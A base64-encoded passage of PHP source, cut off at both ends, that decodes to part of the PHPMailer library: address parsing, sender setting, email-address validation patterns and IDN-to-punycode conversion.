aG9sZSB0aGluZwogICAgICAgICAgICAgICAgICAgIGlmIChzdGF0aWM6OnZhbGlkYXRlQWRkcmVzcygkYWRkcmVzcykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGFkZHJlc3Nlc1tdID0gWwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ25hbWUnID0+ICcnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2FkZHJlc3MnID0+ICRhZGRyZXNzLAogICAgICAgICAgICAgICAgICAgICAgICBdOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgbGlzdCgkbmFtZSwgJGVtYWlsKSA9IGV4cGxvZGUoJzwnLCAkYWRkcmVzcyk7CiAgICAgICAgICAgICAgICAgICAgJGVtYWlsID0gdHJpbShzdHJfcmVwbGFjZSgnPicsICcnLCAkZW1haWwpKTsKICAgICAgICAgICAgICAgICAgICAkbmFtZSA9IHRyaW0oJG5hbWUpOwogICAgICAgICAgICAgICAgICAgIGlmIChzdGF0aWM6OnZhbGlkYXRlQWRkcmVzcygkZW1haWwpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIC8vQ2hlY2sgZm9yIGEgTWJzdHJpbmcgY29uc3RhbnQgcmF0aGVyIHRoYW4gdXNpbmcgZXh0ZW5zaW9uX2xvYWRlZCwgd2hpY2ggaXMgc29tZXRpbWVzIGRpc2FibGVkCiAgICAgICAgICAgICAgICAgICAgICAgIC8vSWYgdGhpcyBuYW1lIGlzIGVuY29kZWQsIGRlY29kZSBpdAogICAgICAgICAgICAgICAgICAgICAgICBpZiAoZGVmaW5lZCgnTUJfQ0FTRV9VUFBFUicpICYmIHByZWdfbWF0Y2goJy9ePVw/LipcPz0kL3MnLCAkbmFtZSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRvcmlnQ2hhcnNldCA9IG1iX2ludGVybmFsX2VuY29kaW5nKCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBtYl9pbnRlcm5hbF9lbmNvZGluZygkY2hhcnNldCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAvL1VuZG8gYW55IFJGQzIwNDctZW5jb2RlZCBzcGFjZXMtYXMtdW5kZXJzY29yZXMKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRuYW1lID0gc3RyX3JlcGxhY2UoJ18nLCAnPTIwJywgJG5hbWUpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy9EZWNvZGUgdGhlIG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRuYW1lID0gbWJfZGVjb2RlX21pbWVoZWFkZXIoJG5hbWUpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWJfaW50ZXJuYWxfZW5jb2RpbmcoJG9yaWdDaGFyc2V0KTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkYWRkcmVzc2VzW10gPSBbCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAvL1JlbW92ZSBhbnkgc3Vycm91bmRpbmcgcXVvdGVzIGFuZCBzcGFjZXMgZnJvbSB0aGUgbmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ25hbWUnID0+IHRyaW0oJG5hbWUsICdcJyIgJyksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnYWRkcmVzcycgPT4gJGVtYWlsLAogICAgICAgICAgICAgICAgICAgICAgICBdOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICRhZGRyZXNzZXM7CiAgICB9CgogICAgLyoqCiAgICAgKiBTZXQgdGhlIEZyb20gYW5kIEZyb21OYW1lIHByb3BlcnRpZXMuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkYWRkcmVzcwogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZQogICAgICogQHBhcmFtIGJvb2wgICAkYXV0byAgICBXaGV0aGVyIHRvIGFsc28gc2V0IHRoZSBTZW5kZXIgYWRkcmVzcywgZGVmYXVsdHMgdG8gdHJ1ZQogICAgICoKICAgICAqIEB0aHJvd3MgRXhjZXB0aW9uCiAgICAgKgogICAgICogQHJldHVybiBib29sCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzZXRGcm9tKCRhZGRyZXNzLCAkbmFtZSA9ICcnLCAkYXV0byA9IHRydWUpCiAgICB7CiAgICAgICAgJGFkZHJlc3MgPSB0cmltKChzdHJpbmcpJGFkZHJlc3MpOwogICAgICAgICRuYW1lID0gdHJpbShwcmVnX3JlcGxhY2UoJy9bXHJcbl0rLycsICcnLCAkbmFtZSkpOyAvL1N0cmlwIGJyZWFrcyBhbmQgdHJpbQogICAgICAgIC8vRG9uJ3QgdmFsaWRhdGUgbm93IGFkZHJlc3NlcyB3aXRoIElETi4gV2lsbCBiZSBkb25lIGluIHNlbmQoKS4KICAgICAgICAkcG9zID0gc3RycnBvcygkYWRkcmVzcywgJ0AnKTsKICAgICAgICBpZiAoCiAgICAgICAgICAgIChmYWxzZSA9PT0gJHBvcykKICAgICAgICAgICAgfHwgKCghJHRoaXMtPmhhczhiaXRDaGFycyhzdWJzdHIoJGFkZHJlc3MsICsrJHBvcykpIHx8ICFzdGF0aWM6OmlkblN1cHBvcnRlZCgpKQogICAgICAgICAgICAmJiAhc3RhdGljOjp2YWxpZGF0ZUFkZHJlc3MoJGFkZHJlc3MpKQogICAgICAgICkgewogICAgICAgICAgICAkZXJyb3JfbWVzc2FnZSA9IHNwcmludGYoCiAgICAgICAgICAgICAgICAnJXMgKEZyb20pOiAlcycsCiAgICAgICAgICAgICAgICAkdGhpcy0+bGFuZygnaW52YWxpZF9hZGRyZXNzJyksCiAgICAgICAgICAgICAgICAkYWRkcmVzcwogICAgICAgICAgICApOwogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRlcnJvcl9tZXNzYWdlKTsKICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCRlcnJvcl9tZXNzYWdlKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICAkdGhpcy0+RnJvbSA9ICRhZGRyZXNzOwogICAgICAgICR0aGlzLT5Gcm9tTmFtZSA9ICRuYW1lOwogICAgICAgIGlmICgkYXV0byAmJiBlbXB0eSgkdGhpcy0+U2VuZGVyKSkgewogICAgICAgICAgICAkdGhpcy0+U2VuZGVyID0gJGFkZHJlc3M7CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KCiAgICAvKioKICAgICAqIFJldHVybiB0aGUgTWVzc2FnZS1JRCBoZWFkZXIgb2YgdGhlIGxhc3QgZW1haWwuCiAgICAgKiBUZWNobmljYWxseSB0aGlzIGlzIHRoZSB2YWx1ZSBmcm9tIHRoZSBsYXN0IHRpbWUgdGhlIGhlYWRlcnMgd2VyZSBjcmVhdGVkLAogICAgICogYnV0IGl0J3MgYWxzbyB0aGUgbWVzc2FnZSBJRCBvZiB0aGUgbGFzdCBzZW50IG1lc3NhZ2UgZXhjZXB0IGluCiAgICAgKiBwYXRob2xvZ2ljYWwgY2FzZXMuCiAgICAgKgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGdldExhc3RNZXNzYWdlSUQoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+bGFzdE1lc3NhZ2VJRDsKICAgIH0KCiAgICAvKioKICAgICAqIENoZWNrIHRoYXQgYSBzdHJpbmcgbG9va3MgbGlrZSBhbiBlbWFpbCBhZGRyZXNzLgogICAgICogVmFsaWRhdGlvbiBwYXR0ZXJucyBzdXBwb3J0ZWQ6CiAgICAgKiAqIGBhdXRvYCBQaWNrIGJlc3QgcGF0dGVybiBhdXRvbWF0aWNhbGx5OwogICAgICogKiBgcGNyZThgIFVzZSB0aGUgc3F1aWxvb3BsZS5jb20gcGF0dGVybiwgcmVxdWlyZXMgUENSRSA+IDguMDsKICAgICAqICogYHBjcmVgIFVzZSBvbGQgUENSRSBpbXBsZW1lbnRhdGlvbjsKICAgICAqICogYHBocGAgVXNlIFBIUCBidWlsdC1pbiBGSUxURVJfVkFMSURBVEVfRU1BSUw7CiAgICAgKiAqIGBodG1sNWAgVXNlIHRoZSBwYXR0ZXJuIGdpdmVuIGJ5IHRoZSBIVE1MNSBzcGVjIGZvciAnZW1haWwnIHR5cGUgZm9ybSBpbnB1dCBlbGVtZW50cy4KICAgICAqICogYGVhaWAgVXNlIGEgcGF0dGVybiBzaW1pbGFyIHRvIHRoZSBIVE1MNSBzcGVjIGZvciAnZW1haWwnIGFuZCB0byBmaXJlZm94LCBleHRlbmRlZCB0byBzdXBwb3J0IEVBSSAoUkZDNjUzMCkuCiAgICAgKiAqIGBub3JlZ2V4YCBEb24ndCB1c2UgYSByZWdleDogc3VwZXIgZmFzdCwgcmVhbGx5IGR1bWIuCiAgICAgKiBBbHRlcm5hdGl2ZWx5IHlvdSBtYXkgcGFzcyBpbiBhIGNhbGxhYmxlIHRvIGluamVjdCB5b3VyIG93biB2YWxpZGF0b3IsIGZvciBleGFtcGxlOgogICAgICoKICAgICAqIGBgYHBocAogICAgICogUEhQTWFpbGVyOjp2YWxpZGF0ZUFkZHJlc3MoJ3VzZXJAZXhhbXBsZS5jb20nLCBmdW5jdGlvbigkYWRkcmVzcykgewogICAgICogICAgIHJldHVybiAoc3RycG9zKCRhZGRyZXNzLCAnQCcpICE9PSBmYWxzZSk7CiAgICAgKiB9KTsKICAgICAqIGBgYAogICAgICoKICAgICAqIFlvdSBjYW4gYWxzbyBzZXQgdGhlIFBIUE1haWxlcjo6JHZhbGlkYXRvciBzdGF0aWMgdG8gYSBjYWxsYWJsZSwgYWxsb3dpbmcgYnVpbHQtaW4gbWV0aG9kcyB0byB1c2UgeW91ciB2YWxpZGF0b3IuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAgICAgICAgICAkYWRkcmVzcyAgICAgICBUaGUgZW1haWwgYWRkcmVzcyB0byBjaGVjawogICAgICogQHBhcmFtIHN0cmluZ3xjYWxsYWJsZSAkcGF0dGVybnNlbGVjdCBXaGljaCBwYXR0ZXJuIHRvIHVzZQogICAgICoKICAgICAqIEByZXR1cm4gYm9vbAogICAgICovCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIHZhbGlkYXRlQWRkcmVzcygkYWRkcmVzcywgJHBhdHRlcm5zZWxlY3QgPSBudWxsKQogICAgewogICAgICAgIGlmIChudWxsID09PSAkcGF0dGVybnNlbGVjdCkgewogICAgICAgICAgICAkcGF0dGVybnNlbGVjdCA9IHN0YXRpYzo6JHZhbGlkYXRvcjsKICAgICAgICB9CiAgICAgICAgLy9Eb24ndCBhbGxvdyBzdHJpbmdzIGFzIGNhbGxhYmxlcywgc2VlIFNFQ1VSSVRZLm1kIGFuZCBDVkUtMjAyMS0zNjAzCiAgICAgICAgaWYgKGlzX2NhbGxhYmxlKCRwYXR0ZXJuc2VsZWN0KSAmJiAhaXNfc3RyaW5nKCRwYXR0ZXJuc2VsZWN0KSkgewogICAgICAgICAgICByZXR1cm4gY2FsbF91c2VyX2Z1bmMoJHBhdHRlcm5zZWxlY3QsICRhZGRyZXNzKTsKICAgICAgICB9CiAgICAgICAgLy9SZWplY3QgbGluZSBicmVha3MgaW4gYWRkcmVzc2VzOyBpdCdzIHZhbGlkIFJGQzUzMjIsIGJ1dCBub3QgUkZDNTMyMQogICAgICAgIGlmIChzdHJwb3MoJGFkZHJlc3MsICJcbiIpICE9PSBmYWxzZSB8fCBzdHJwb3MoJGFkZHJlc3MsICJcciIpICE9PSBmYWxzZSkgewogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIHN3aXRjaCAoJHBhdHRlcm5zZWxlY3QpIHsKICAgICAgICAgICAgY2FzZSAncGNyZSc6IC8vS2VwdCBmb3IgQkMKICAgICAgICAgICAgY2FzZSAncGNyZTgnOgogICAgICAgICAgICAgICAgLyoKICAgICAgICAgICAgICAgICAqIEEgbW9yZSBjb21wbGV4IGFuZCBtb3JlIHBlcm1pc3NpdmUgdmVyc2lvbiBvZiB0aGUgUkZDNTMyMiByZWdleCBvbiB3aGljaCBGSUxURVJfVkFMSURBVEVfRU1BSUwKICAgICAgICAgICAgICAgICAqIGlzIGJhc2VkLgogICAgICAgICAgICAgICAgICogSW4gYWRkaXRpb24gdG8gdGhlIGFkZHJlc3NlcyBhbGxvd2VkIGJ5IGZpbHRlcl92YXIsIGFsc28gcGVybWl0czoKICAgICAgICAgICAgICAgICAqICAqIGRvdGxlc3MgZG9tYWluczogYGFAYmAKICAgICAgICAgICAgICAgICAqICAqIGNvbW1lbnRzOiBgMTIzNCBAIGxvY2FsKGJsYWgpIC5tYWNoaW5lIC5leGFtcGxlYAogICAgICAgICAgICAgICAgICogICogcXVvdGVkIGVsZW1lbnRzOiBgJyJ0ZXN0IGJsYWgiQGV4YW1wbGUub3JnJ2AKICAgICAgICAgICAgICAgICAqICAqIG51bWVyaWMgVExEczogYGFAYi4xMjNgCiAgICAgICAgICAgICAgICAgKiAgKiB1bmJyYWNrZXRlZCBJUHY0IGxpdGVyYWxzOiBgYUAxOTIuMTY4LjAuMWAKICAgICAgICAgICAgICAgICAqICAqIElQdjYgbGl0ZXJhbHM6ICdmaXJzdC5sYXN0QFtJUHY2OmExOjpdJwogICAgICAgICAgICAgICAgICogTm90IGFsbCBvZiB0aGVzZSB3aWxsIG5lY2Vzc2FyaWx5IHdvcmsgZm9yIHNlbmRpbmchCiAgICAgICAgICAgICAgICAgKgogICAgICAgICAgICAgICAgICogQGNvcHlyaWdodCAyMDA5LTIwMTAgTWljaGFlbCBSdXNodG9uCiAgICAgICAgICAgICAgICAgKiBGZWVsIGZyZWUgdG8gdXNlIGFuZCByZWRpc3RyaWJ1dGUgdGhpcyBjb2RlLiBCdXQgcGxlYXNlIGtlZXAgdGhpcyBjb3B5cmlnaHQgbm90aWNlLgogICAgICAgICAgICAgICAgICovCiAgICAgICAgICAgICAgICByZXR1cm4gKGJvb2wpIHByZWdfbWF0Y2goCiAgICAgICAgICAgICAgICAgICAgJy9eKD8hKD8+KD8xKSI/KD8+XFxcWyAtfl18W14iXSkiPyg/MSkpezI1NSx9KSg/ISg/Pig/MSkiPyg/PlxcXFsgLX5dfFteIl0pIj8oPzEpKXs2NSx9QCknIC4KICAgICAgICAgICAgICAgICAgICAnKCg/Pig/Pig/PigoPz4oPz4oPz5ceDBEXHgwQSk/W1x0IF0pK3woPz5bXHQgXSpceDBEXHgwQSk/W1x0IF0rKT8pKFwoKD8+KD8yKScgLgogICAgICAgICAgICAgICAgICAgICcoPz5bXHgwMS1ceDA4XHgwQlx4MENceDBFLVwnKi1cW1xdLVx4N0ZdfFxcXFtceDAwLVx4N0ZdfCg/MykpKSooPzIpXCkpKSsoPzIpKXwoPzIpKT8pJyAuCiAgICAgICAgICAgICAgICAgICAgJyhbISMtXCcqK1wvLTk9P14tfi1dK3wiKD8+KD8yKSg/PltceDAxLVx4MDhceDBCXHgwQ1x4MEUtISMtXFtcXS1ceDdGXXxcXFxbXHgwMC1ceDdGXSkpKicgLgogICAgICAgICAgICAgICAgICAgICcoPzIpIikoPz4oPzEpXC4oPzEpKD80KSkqKD8xKUAoPyEoPzEpW2EtejAtOS1dezY0LH0pKD8xKSg/PihbYS16MC05XSg/PlthLXowLTktXSpbYS16MC05XSk/KScgLgogICAgICAgICAgICAgICAgICAgICcoPz4oPzEpXC4oPyEoPzEpW2EtejAtOS1dezY0LH0pKD8xKSg/NSkpezAsMTI2fXxcWyg/Oig/PklQdjY6KD8+KFthLWYwLTldezEsNH0pKD8+Oig/Nikpezd9JyAuCiAgICAgICAgICAgICAgICAgICAgJ3woPyEoPzouKlthLWYwLTldWzpcXV0pezgsfSkoKD82KSg/PjooPzYpKXswLDZ9KT86Oig/Nyk/KSl8KD8+KD8+SVB2NjooPz4oPzYpKD8+Oig/NikpezV9OicgLgogICAgICAgICAgICAgICAgICAgICd8KD8hKD86LipbYS1mMC05XTopezYsfSkoPzgpPzo6KD8+KCg/NikoPz46KD82KSl7MCw0fSk6KT8pKT8oMjVbMC01XXwyWzAtNF1bMC05XXwxWzAtOV17Mn0nIC4KICAgICAgICAgICAgICAgICAgICAnfFsxLTldP1swLTldKSg/PlwuKD85KSl7M30pKVxdKSg/MSkkL2lzRCcsCiAgICAgICAgICAgICAgICAgICAgJGFkZHJlc3MKICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgIGNhc2UgJ2h0bWw1JzoKICAgICAgICAgICAgICAgIC8qCiAgICAgICAgICAgICAgICAgKiBUaGlzIGlzIHRoZSBwYXR0ZXJuIHVzZWQgaW4gdGhlIEhUTUw1IHNwZWMgZm9yIHZhbGlkYXRpb24gb2YgJ2VtYWlsJyB0eXBlIGZvcm0gaW5wdXQgZWxlbWVudHMuCiAgICAgICAgICAgICAgICAgKgogICAgICAgICAgICAgICAgICogQHNlZSBodHRwczovL2h0bWwuc3BlYy53aGF0d2cub3JnLyNlLW1haWwtc3RhdGUtKHR5cGU9ZW1haWwpCiAgICAgICAgICAgICAgICAgKi8KICAgICAgICAgICAgICAgIHJldHVybiAoYm9vbCkgcHJlZ19tYXRjaCgKICAgICAgICAgICAgICAgICAgICAnL15bYS16QS1aMC05LiEjJCUmXCcqK1wvPT9eX2B7fH1+LV0rQFthLXpBLVowLTldKD86W2EtekEtWjAtOS1dezAsNjF9JyAuCiAgICAgICAgICAgICAgICAgICAgJ1thLXpBLVowLTldKT8oPzpcLlthLXpBLVowLTldKD86W2EtekEtWjAtOS1dezAsNjF9W2EtekEtWjAtOV0pPykqJC9zRCcsCiAgICAgICAgICAgICAgICAgICAgJGFkZHJlc3MKICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgIGNhc2UgJ2VhaSc6CiAgICAgICAgICAgICAgICAvKgogICAgICAgICAgICAgICAgICogVGhpcyBpcyB0aGUgcGF0dGVybiB1c2VkIGluIHRoZSBIVE1MNSBzcGVjIGZvciB2YWxpZGF0aW9uIG9mICdlbWFpbCcgdHlwZQogICAgICAgICAgICAgICAgICogZm9ybSBpbnB1dCBlbGVtZW50cyAoYXMgYWJvdmUpLCBtb2RpZmllZCB0byBhY2NlcHQgVW5pY29kZSBlbWFpbCBhZGRyZXNzZXMuCiAgICAgICAgICAgICAgICAgKiBUaGlzIGlzIGFsc28gbW9yZSBsZW5pZW50IHRoYW4gRmlyZWZveCcgaHRtbDUgc3BlYywgaW4gb3JkZXIgdG8gbWFrZSB0aGUgcmVnZXggZmFzdGVyLgogICAgICAgICAgICAgICAgICogJ2VhaScgaXMgYW4gYWNyb255bSBmb3IgRW1haWwgQWRkcmVzcyBJbnRlcm5hdGlvbmFsaXphdGlvbi4KICAgICAgICAgICAgICAgICAqIFRoaXMgdmFsaWRhdG9yIGlzIHNlbGVjdGVkIGF1dG9tYXRpY2FsbHkgaWYgeW91IGF0dGVtcHQgdG8gdXNlIHJlY2lwaWVudCBhZGRyZXNzZXMKICAgICAgICAgICAgICAgICAqIHRoYXQgY29udGFpbiBVbmljb2RlIGNoYXJhY3RlcnMgaW4gdGhlIGxvY2FsIHBhcnQuCiAgICAgICAgICAgICAgICAgKgogICAgICAgICAgICAgICAgICogQHNlZSBodHRwczovL2h0bWwuc3BlYy53aGF0d2cub3JnLyNlLW1haWwtc3RhdGUtKHR5cGU9ZW1haWwpCiAgICAgICAgICAgICAgICAgKiBAc2VlIGh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL0ludGVybmF0aW9uYWxfZW1haWwKICAgICAgICAgICAgICAgICAqLwogICAgICAgICAgICAgICAgcmV0dXJuIChib29sKSBwcmVnX21hdGNoKAogICAgICAgICAgICAgICAgICAgICcvXlstXHB7TH1ccHtOfVxwe019LiEjJCUmXCcqK1wvPT9eX2B7fH1+XStAW1xwe0x9XHB7Tn1ccHtNfV0oPzpbXHB7TH1ccHtOfVxwe019LV17MCw2MX0nIC4KICAgICAgICAgICAgICAgICAgICAnW1xwe0x9XHB7Tn1ccHtNfV0pPyg/OlwuW1xwe0x9XHB7Tn1ccHtNfV0nIC4KICAgICAgICAgICAgICAgICAgICAnKD86Wy1ccHtMfVxwe059XHB7TX1dezAsNjF9W1xwe0x9XHB7Tn1ccHtNfV0pPykqJC91c0QnLAogICAgICAgICAgICAgICAgICAgICRhZGRyZXNzCiAgICAgICAgICAgICAgICApOwogICAgICAgICAgICBjYXNlICdwaHAnOgogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgcmV0dXJuIGZpbHRlcl92YXIoJGFkZHJlc3MsIEZJTFRFUl9WQUxJREFURV9FTUFJTCkgIT09IGZhbHNlOwogICAgICAgIH0KICAgIH0KCiAgICAvKioKICAgICAqIFRlbGxzIHdoZXRoZXIgSUROcyAoSW50ZXJuYXRpb25hbGl6ZWQgRG9tYWluIE5hbWVzKSBhcmUgc3VwcG9ydGVkIG9yIG5vdC4gVGhpcyByZXF1aXJlcyB0aGUKICAgICAqIGBpbnRsYCBhbmQgYG1ic3RyaW5nYCBQSFAgZXh0ZW5zaW9ucy4KICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wgYHRydWVgIGlmIHJlcXVpcmVkIGZ1bmN0aW9ucyBmb3IgSUROIHN1cHBvcnQgYXJlIHByZXNlbnQKICAgICAqLwogICAgcHVibGljIHN0YXRpYyBmdW5jdGlvbiBpZG5TdXBwb3J0ZWQoKQogICAgewogICAgICAgIHJldHVybiBmdW5jdGlvbl9leGlzdHMoJ2lkbl90b19hc2NpaScpICYmIGZ1bmN0aW9uX2V4aXN0cygnbWJfY29udmVydF9lbmNvZGluZycpOwogICAgfQoKICAgIC8qKgogICAgICogQ29udmVydHMgSUROIGluIGdpdmVuIGVtYWlsIGFkZHJlc3MgdG8gaXRzIEFTQ0lJIGZvcm0sIGFsc28ga25vd24gYXMgcHVueWNvZGUsIGlmIHBvc3NpYmxlLgogICAgICogSW1wb3J0YW50OiBBZGRyZXNzIG11c3QgYmUgcGFzc2VkIGluIHNhbWUgZW5jb2RpbmcgYXMgY3VycmVudGx5IHNldCBpbiBQSFBNYWlsZXI6OiRDaGFyU2V0LgogICAgICogVGhpcyBmdW5jdGlvbiBzaWxlbnRseSByZXR1cm5zIHVubW9kaWZpZWQgYWRkcmVzcyBpZjoKICAgICAqIC0gTm8gY29udmVyc2lvbiBpcyBuZWNlc3NhcnkgKGkuZS4gZG9tYWluIG5hbWUgaXMgbm90IGFuIElETiwgb3IgaXMgYWxyZWFkeSBpbiBBU0NJSSBmb3JtKQogICAgICogLSBDb252ZXJzaW9uIHRvIHB1bnljb2RlIGlzIGltcG9zc2libGUgKGUuZy4gcmVxdWlyZWQgUEhQIGZ1bmN0aW9ucyBhcmUgbm90IGF2YWlsYWJsZSkKICAgICAqICAgb3IgZmFpbHMgZm9yIGFueSByZWFzb24gKGUuZy4gZG9tYWluIGNvbnRhaW5zIGNoYXJhY3RlcnMgbm90IGFsbG93ZWQgaW4gYW4gSUROKS4KICAgICAqCiAgICAgKiBAc2VlIFBIUE1haWxlcjo6JENoYXJTZXQKICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRhZGRyZXNzIFRoZSBlbWFpbCBhZGRyZXNzIHRvIGNvbnZlcnQKICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZyBUaGUgZW5jb2RlZCBhZGRyZXNzIGluIEFTQ0lJIGZvcm0KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHB1bnllbmNvZGVBZGRyZXNzKCRhZGRyZXNzKQogICAgewogICAgICAgIC8vVmVyaWZ5IHdlIGhhdmUgcmVxdWlyZWQgZnVuY3Rpb25zLCBDaGFyU2V0LCBhbmQgYXQtc2lnbi4KICAgICAgICAkcG9zID0gc3RycnBvcygkYWRkcmVzcywgJ0AnKTsKICAgICAgICBpZiAoCiAgICAgICAgICAgICFlbXB0eSgkdGhpcy0+Q2hhclNldCkgJiYKICAgICAgICAgICAgZmFsc2UgIT09ICRwb3MgJiYKICAgICAgICAgICAgc3RhdGljOjppZG5TdXBwb3J0ZWQoKQogICAgICAgICkgewogICAgICAgICAgICAkZG9tYWluID0gc3Vic3RyKCRhZGRyZXNzLCArKyRwb3MpOwogICAgICAgICAgICAvL1ZlcmlmeSBDaGFyU2V0IHN0cmluZyBpcyBhIHZhbGlkIG9uZSwgYW5kIGRvbWFpbiBwcm9wZXJseSBlbmNvZGVkIGluIHRoaXMgQ2hhclNldC4KICAgICAgICAgICAgaWYgKCR0aGlzLT5oYXM4Yml0Q2hhcnMoJGRvbWFpbikgJiYgQG1iX2NoZWNrX2VuY29kaW5nKCRkb21haW4sICR0aGlzLT5DaGFyU2V0KSkgewogICAgICAgICAgICAgICAgLy9Db252ZXJ0IHRoZSBkb21haW4gZnJvbSB3aGF0ZXZlciBjaGFyc2V0IGl0J3MgaW4gdG8gVVRGLTgKICAgICAgICAgICAgICAgICRkb21haW4gPSBtYl9jb252ZXJ0X2VuY29kaW5nKCRkb21haW4sIHNlbGY6OkNIQVJTRVRfVVRGOCwgJHRoaXMtPkNoYXJTZXQpOwogICAgICAgICAgICAgICAgLy9JZ25vcmUgSURFIGNvbXBsYWludHMgYWJvdXQgdGhpcyBsaW5lIC0gbWV0aG9kIHNpZ25hdHVyZSBjaGFuZ2VkIGluIFBIUCA1LjQKICAgICAgICAgICAgICAgICRlcnJvcmNvZGUgPSAwOwogICAgICAgICAgICAgICAgaWYgKGRlZmluZWQoJ0lOVExfSUROQV9WQVJJQU5UX1VUUzQ2JykpIHsKICAgICAgICAgICAgICAgICAgICAvL1VzZSB0aGUgY3VycmVudCBwdW55Y29kZSBzdGFuZGFyZCAoYXBwZWFyZWQgaW4gUEhQIDcuMikKICAgICAgICAgICAgICAgICAgICAkcHVueWNvZGUgPSBpZG5fdG9fYXNjaWkoCiAgICAgICAgICAgICAgICAgICAgICAgICRkb21haW4sCiAgICAgICAgICAgICAgICAgICAgICAgIFxJRE5BX0RFRkFVTFQgfCBcSUROQV9VU0VfU1REM19SVUxFUyB8IFxJRE5BX0NIRUNLX0JJREkgfAogICAgICAgICAgICAgICAgICAgICAgICAgICAgXElETkFfQ0hFQ0tfQ09OVEVYVEogfCBcSUROQV9OT05UUkFOU0lUSU9OQUxfVE9fQVNDSUksCiAgICAgICAgICAgICAgICAgICAgICAgIFxJTlRMX0lETkFfVkFSSUFOVF9VVFM0NgogICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICB9IGVsc2VpZiAoZGVmaW5lZCgnSU5UTF9JRE5BX1ZBUklBTlRfMjAwMycpKSB7CiAgICAgICAgICAgICAgICAgICAgLy9GYWxsIGJhY2sgdG8gdGhpcyBvbGQsIGRlcHJlY2F0ZWQvcmVtb3ZlZCBlbmNvZGluZwogICAgICAgICAgICAgICAgICAgICRwdW55Y29kZSA9IGlkbl90b19hc2NpaSgkZG9tYWluLCAkZXJyb3Jjb2RlLCBcSU5UTF9JRE5BX1ZBUklBTlRfMjAwMyk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIC8vRmFsbCBiYWNrIHRvIGEgZGVmYXVsdCB3ZSBkb24ndCBrbm93IGFib3V0CiAgICAgICAgICAgICAgICAgICAgJHB1bnljb2RlID0gaWRuX3RvX2FzY2lpKCRkb21haW4sICRlcnJvcmNvZGUpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKGZhbHNlICE9PSAkcHVueWNvZGUpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gc3Vic3RyKCRhZGRyZXNzLCAwLCAkcG9zKSAuICRwdW55Y29kZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICRhZGRyZXNzOwogICAgfQoKICAgIC8qKgogICAgICogQ3JlYXRlIGEgbWVzc2FnZSBhbmQgc2VuZCBpdC4KICAgICAqIFVzZXMgdGhlIHNlbmRpbmcgbWV0aG9kIHNwZWNpZmllZCBieSAkTWFpbGVyLgogICAgICoKICAgICAqIEB0aHJvd3MgRXhjZXB0aW9uCiAgICAgKgogICAgICogQHJldHVybiBib29sIGZhbHNlIG9uIGVycm9yIC0gU2VlIHRoZSBFcnJvckluZm8gcHJvcGVydHkgZm9yIGRldGFpbHMgb2YgdGhlIGVycm9yCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzZW5kKCkKICAgIHsKICAgICAgICB0cnkgewogICAgICAgICAgICBpZiAoISR0aGlzLT5wcmVTZW5kKCkpIHsKICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5wb3N0U2VuZCgpOwogICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiAkZXhjKSB7CiAgICAgICAgICAgICR0aGlzLT5tYWlsSGVhZGVyID0gJyc7CiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXhjLT5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsKICAgICAgICAgICAgICAgIHRocm93ICRleGM7CiAgICAgICAgICAgI